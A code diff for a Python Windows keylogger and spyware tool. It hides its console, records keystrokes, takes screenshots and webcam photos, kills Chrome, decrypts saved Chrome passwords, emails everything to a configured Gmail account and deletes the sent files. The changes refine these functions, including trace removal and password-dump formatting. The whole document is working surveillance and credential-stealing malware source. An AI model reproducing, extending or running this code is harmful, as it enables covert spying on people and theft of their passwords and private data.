@@ -1,4 +1,6 @@
+import os
 import time
+import psutil
 import pyHook
 import smtplib
 import sqlite3
@@ -6,6 +8,7 @@ import win32gui
 import mimetypes
 import pythoncom
 import win32crypt
+import subprocess
 import win32console
 import win32clipboard
 from os import getenv
@@ -25,6 +28,9 @@ JOB_NUMBER = [1, 2, 3, 4, 5, ]
 queue = Queue()
 
 
+PROCNAME = "chrome.exe"
+
+
 # KEYLOGGER CONFIG
 # output file name
 f_name = "output.txt"
@@ -34,9 +40,10 @@ f_name = "output.txt"
 
 # Screenshot
 # interval in sec
-interval = 60
+interval = 120
 
 # WebCam
+cam = Device()
 # interval in sec
 interval_webcam = 120
 
@@ -48,39 +55,53 @@ FromConf = 'your_username@gmail.com'
 ToConf = 'your_username@gmail.com'
 passwordConf = 'your_password'
 
-intervalMail = 360
+intervalMail = 600
 
 
-# Hides Window
 def hide():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window, 0)
 hide()
 
 
-# Gets Key if Key is being pressed
+def kill_chrome():
+    for proc in psutil.process_iter():
+        try:
+            if proc.name() == PROCNAME:
+                proc.kill()
+        except:
+            pass
+kill_chrome()
+
+
 def keydown(event):
     global data
     if event.Ascii == 13:
-            keys = '<ENTER>'
+            keys = '  <ENTER>'
             fp = open(f_name, 'a')
             data = keys
             fp.write(data + "\n")
             fp.close()
     elif event.Ascii == 8:
-            keys = '<BACKSPACE>'
+            keys = '  <BACKSPACE>'
             fp = open(f_name, 'a')
             data = keys
-            fp.write(data + "\n")
+            fp.write(data + '\n')
             fp.close()
     elif event.Ascii == 9:
-            keys = '<TAB>'
+            keys = '  <TAB>'
             fp = open(f_name, 'a')
             data = keys
             fp.write(data + "\n")
             fp.close()
     elif event.Ascii == 27:
-            keys = '<ESC>'
+            keys = '  <ESC>'
+            fp = open(f_name, 'a')
+            data = keys
+            fp.write(data + "\n")
+            fp.close()
+    elif event.Ascii == 32:
+            keys = '  <SPACE>  '
             fp = open(f_name, 'a')
             data = keys
             fp.write(data + "\n")
@@ -101,7 +122,6 @@ def keydown(event):
             fp.write(data)
             fp.close()
 
-# Starts Keylogging part and manages it
 def keylogger():
     obj = pyHook.HookManager()
     obj.KeyDown = keydown
@@ -110,26 +130,25 @@ def keylogger():
     pythoncom.PumpMessages()
 
 
-# Takes Photo through webcam
 def webcam_pic(interval_w):
-    cam = Device()
+
     while True:
         time.sleep(interval_w)
-        pic = cam.saveSnapshot('image.png')
-        files.append(pic)
+        cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
+        scr = "webcam_" + cur_time + ".jpg"
+        files.append(str(scr))
+        cam.saveSnapshot(scr)
 
 
-# Makes screenshot
 def screenshot(interval_scr):
     while True:
         time.sleep(interval_scr)
         cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
-        scr = "screenshot" + cur_time + ".png"
-        files.append(scr)
+        scr = "screenshot_" + cur_time + ".png"
+        files.append(str(scr))
         ImageGrab.grab().save(scr, "PNG")
 
 
-# Sends Mail with all the data as attachments
 def send_mail(From, To, password, intervalM):
 
     while True:
@@ -149,48 +168,53 @@ def send_mail(From, To, password, intervalM):
             smtp.login(From, password)
         except:
             login = 'failed'
+            print login
         else:
             login = 'success'
+            print login
 
         if login == 'success':
-            for file in files:
-                ctype, encoding = mimetypes.guess_type(file)
+            for f in files:
+                ctype, encoding = mimetypes.guess_type(f)
                 if ctype is None or encoding is not None:
                     # No guess could be made, or the file is encoded (compressed), so
                     # use a generic bag-of-bits type.
                     ctype = 'application/octet-stream'
                 maintype, subtype = ctype.split('/', 1)
                 if maintype == 'text':
-                    fp = open(file)
+                    fp = open(f)
                     # Note: we should handle calculating the charset
                     part = MIMEText(fp.read(), _subtype=subtype)
                     fp.close()
                 elif maintype == 'image':
-                    fp = open(file, 'rb')
+                    fp = open(f, 'rb')
                     part = MIMEImage(fp.read(), _subtype=subtype)
                     fp.close()
                 else:
-                    fp = open(file, 'rb')
+                    fp = open(f, 'rb')
                     part = MIMEBase(maintype, subtype)
                     part.set_payload(fp.read())
                     fp.close()
-                part.add_header('Content-Disposition', 'attachment; filename="%s"' % file)
+                part.add_header('Content-Disposition', 'attachment; filename="%s"' % f)
                 msg.attach(part)
             try:
                 smtp.sendmail(From, To, msg.as_string())
                 open(f_name, 'w').close()
-                with open(f_name, 'w') as f:
-                    f.write('### Keylogger - Log ###\n')
-                    f.close()
+                with open(f_name, 'w') as fl:
+                    fl.write('### Keylogger - Log ###\n')
+                    fl.close()
                 dump_chrome_passwords()
+                for fi in files[1:]:
+                    os.remove(fi)
                 del files[:]
                 files.append("output.txt")
-                print 'success'
+                smtp.close()
             except:
                 print 'fail'
+                smtp.close()
         else:
-            print 'failed'
             smtp.close()
+            print 'fail'
 
 
 """
@@ -203,7 +227,7 @@ Output:
 
 """
 
-# Dumps all Chrome passwords
+
 def dump_chrome_passwords():
 
     conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
@@ -211,17 +235,22 @@ def dump_chrome_passwords():
 
     cursor.execute('SELECT action_url, username_value, password_value FROM logins')
     with open(f_name, 'a') as f:
-        f.write('\n### All Chrome Passwords ###\n')
+        f.write('\n\n\n### All Chrome Passwords ###\n\n\n')
         f.close()
     for result in cursor.fetchall():
         password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
         if password:
-            with open(f_name, 'w') as f:
-                f.write('### All Chrome Passwords ###' + 'Website: ' + result[0] + '\n' + 'Username: ' + result[1] + '\n' + 'Password: ' + password + '\n\n')
+            site = 'Site: ' + result[0]
+            username = 'Username: ' + result[1]
+            password = 'Password: ' + password
+            with open(f_name, 'a') as f:
+                f.write(site + '\n' + username + '\n' + password + '\n\n')
                 f.close()
+    with open(f_name, 'a') as f:
+        f.write('\n\n### END ###\n\n\n')
+        f.close()
 
 
-# Creates threads for all the seperate processes
 def create_workers():
     for _ in range(NUMBER_OF_THREADS):
         t = Thread(target=work)
@@ -229,7 +258,6 @@ def create_workers():
         t.start()
 
 
-# Basicly 'assigns' workers to threads
 def work():
 
     x = queue.get()
